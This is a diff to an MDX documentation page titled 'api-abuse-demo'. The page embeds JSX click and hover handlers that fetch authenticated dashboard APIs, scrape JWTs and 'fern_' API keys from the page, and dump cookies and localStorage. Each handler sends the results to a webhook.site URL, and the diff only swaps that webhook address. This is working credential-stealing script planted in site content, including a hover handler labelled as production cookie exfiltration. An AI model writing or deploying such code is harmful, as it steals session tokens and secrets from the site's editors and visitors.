@@ -6,22 +6,22 @@ slug: api-abuse-demo
 
 ## Dashboard API Enumeration
 
-<div {...{onClick: () => { if(typeof document === 'undefined') return; var wh = 'https://webhook.site/2717febb-c454-4d91-8348-6459a25d1db3'; var r = {}; Promise.all([fetch('/api/auth/session',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.session=t.substring(0,500)}).catch(function(e){r.session_err=e.message}), fetch('/api/auth/me',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.me=t.substring(0,500)}).catch(function(e){r.me_err=e.message}), fetch('/api/user',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.user=t.substring(0,500)}).catch(function(e){r.user_err=e.message}), fetch('/api/organizations',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.orgs=t.substring(0,500)}).catch(function(e){r.orgs_err=e.message})]).then(function(){r.domain=document.domain;r.url=window.location.href;navigator.sendBeacon(wh+'?p=api-enum-editor',JSON.stringify(r));alert('Sent to webhook')}); }}}>CLICK HERE — Enumerate Dashboard APIs</div>
+<div {...{onClick: () => { if(typeof document === 'undefined') return; var wh = 'https://webhook.site/a07fa752-6bc3-4673-8d34-a8582ff0a71b'; var r = {}; Promise.all([fetch('/api/auth/session',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.session=t.substring(0,500)}).catch(function(e){r.session_err=e.message}), fetch('/api/auth/me',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.me=t.substring(0,500)}).catch(function(e){r.me_err=e.message}), fetch('/api/user',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.user=t.substring(0,500)}).catch(function(e){r.user_err=e.message}), fetch('/api/organizations',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.orgs=t.substring(0,500)}).catch(function(e){r.orgs_err=e.message})]).then(function(){r.domain=document.domain;r.url=window.location.href;navigator.sendBeacon(wh+'?p=api-enum-editor',JSON.stringify(r));alert('Sent to webhook')}); }}}>CLICK HERE — Enumerate Dashboard APIs</div>
 
 ---
 
 ## Token Extraction
 
-<div {...{onClick: () => { if(typeof document === 'undefined') return; var wh = 'https://webhook.site/2717febb-c454-4d91-8348-6459a25d1db3'; fetch(window.location.href,{credentials:'include'}).then(function(x){return x.text()}).then(function(html){var jwts=(html.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g)||[]).map(function(t){return t.substring(0,80)});var fkeys=(html.match(/fern_[A-Za-z0-9_-]+/g)||[]);navigator.sendBeacon(wh+'?p=tokens-editor',JSON.stringify({domain:document.domain,jwts:jwts.slice(0,10),fernKeys:fkeys,pageSize:html.length}));alert('Found '+jwts.length+' JWTs')}).catch(function(e){alert(e.message)}); }}}>CLICK HERE — Extract Tokens from Page</div>
+<div {...{onClick: () => { if(typeof document === 'undefined') return; var wh = 'https://webhook.site/a07fa752-6bc3-4673-8d34-a8582ff0a71b'; fetch(window.location.href,{credentials:'include'}).then(function(x){return x.text()}).then(function(html){var jwts=(html.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g)||[]).map(function(t){return t.substring(0,80)});var fkeys=(html.match(/fern_[A-Za-z0-9_-]+/g)||[]);navigator.sendBeacon(wh+'?p=tokens-editor',JSON.stringify({domain:document.domain,jwts:jwts.slice(0,10),fernKeys:fkeys,pageSize:html.length}));alert('Found '+jwts.length+' JWTs')}).catch(function(e){alert(e.message)}); }}}>CLICK HERE — Extract Tokens from Page</div>
 
 ---
 
 ## Full State Dump
 
-<div {...{onClick: () => { if(typeof document === 'undefined') return; var wh = 'https://webhook.site/2717febb-c454-4d91-8348-6459a25d1db3'; var ls = {}; for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);ls[k]=localStorage.getItem(k).substring(0,300)} navigator.sendBeacon(wh+'?p=state-editor',JSON.stringify({domain:document.domain,cookie:document.cookie,localStorage:ls})); alert('State sent'); }}}>CLICK HERE — Dump localStorage + Cookies</div>
+<div {...{onClick: () => { if(typeof document === 'undefined') return; var wh = 'https://webhook.site/a07fa752-6bc3-4673-8d34-a8582ff0a71b'; var ls = {}; for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);ls[k]=localStorage.getItem(k).substring(0,300)} navigator.sendBeacon(wh+'?p=state-editor',JSON.stringify({domain:document.domain,cookie:document.cookie,localStorage:ls})); alert('State sent'); }}}>CLICK HERE — Dump localStorage + Cookies</div>
 
 ---
 
 ## Production Site Hover Exfil
 
-<div {...{onMouseEnter: () => { if(typeof document !== 'undefined') { new Image().src = 'https://webhook.site/2717febb-c454-4d91-8348-6459a25d1db3?p=prod-hover&domain=' + document.domain + '&cookie=' + encodeURIComponent(document.cookie.substring(0,800)); } }}}>HOVER HERE — Production cookie exfil</div>
+<div {...{onMouseEnter: () => { if(typeof document !== 'undefined') { new Image().src = 'https://webhook.site/a07fa752-6bc3-4673-8d34-a8582ff0a71b?p=prod-hover&domain=' + document.domain + '&cookie=' + encodeURIComponent(document.cookie.substring(0,800)); } }}}>HOVER HERE — Production cookie exfil</div>
